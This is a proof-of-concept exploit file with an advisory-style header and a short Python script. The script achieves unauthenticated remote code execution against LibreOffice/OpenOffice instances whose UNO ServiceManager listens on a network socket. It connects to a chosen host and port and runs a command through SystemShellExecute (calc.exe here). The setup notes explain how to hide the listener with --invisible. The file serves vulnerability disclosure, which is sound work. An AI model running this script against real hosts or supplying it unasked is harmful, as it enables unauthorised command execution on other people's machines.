"""
# Exploit Title: Apache UNO API RCE
# Date: 2018-09-18
# Exploit Author: sud0woodo
# Vendor Homepage: https://www.apache.org/
# Software Link: https://www.openoffice.org/api/
# Version:

LibreOffice Version: 6.1.2 / OpenOffice 4.1.6

(but really any version with the UNO API included)
# Tested on:

Ubuntu Mate 18.04 with kernel 4.15.0-34-generic (but works platform independent)

Proof of Concept code attached as .txt file.

HackDefense advisory:
https://hackdefense.com/blog/security-advisory-rce-in-apache-uno-api/

HackDefense blogpost:
https://hackdefense.com/blog/finding-RCE-capabilities-in-the-apache-uno-api/

Unauthenticated RCE LibreOffice/OpenOffice with UNO API

This code represents a small proof of concept of an unauthenticted remote code execution using
the Apache OpenOffice UNO API (https://www.openoffice.org/udk/). This code has been tested
against LibreOffice Version: 6.1.1.2 on a Ubuntu Mate 18.04 with kernel 4.15.0-34-generic.

For this PoC to work the target machine needs to run the ServiceManager using an external
interface. The following command was used to test this PoC:

[Ubuntu]
Open a terminal and execute the following command:
    soffice --accept='socket,host=0.0.0.0,port=2002;urp;StarOffice.Service'

The above command will start the LibreOffice ServiceManager but this can be executed with the --invisible
flag to prevent the dialogbox from popping up on the target.

I also made a scanner available that can be used to check for the presence of the StarOffice manager running on a machine:

https://sud0woodo.sh/2019/03/06/building-a-go-scanner-to-search-externally-reachable-staroffice-managers/
"""

import uno
from com.sun.star.system import XSystemShellExecute
import argparse

parser = argparse.ArgumentParser()
parser.add_argument('--host', help='host to connect to', dest='host', required=True)
parser.add_argument('--port', help='port to connect to', dest='port', required=True)

args = parser.parse_args()
# Define the UNO component
localContext = uno.getComponentContext()

# Define the resolver to use, this is used to connect with the API
resolver = localContext.ServiceManager.createInstanceWithContext(
				"com.sun.star.bridge.UnoUrlResolver", localContext )

# Connect with the provided host on the provided target port
print("[+] Connecting to target...")
context = resolver.resolve(
	"uno:socket,host={0},port={1};urp;StarOffice.ComponentContext".format(args.host,args.port))

# Issue the service manager to spawn the SystemShellExecute module and execute calc.exe
service_manager = context.ServiceManager
print("[+] Connected to {0}".format(args.host))
shell_execute = service_manager.createInstance("com.sun.star.system.SystemShellExecute")
shell_execute.execute("calc.exe", '',1)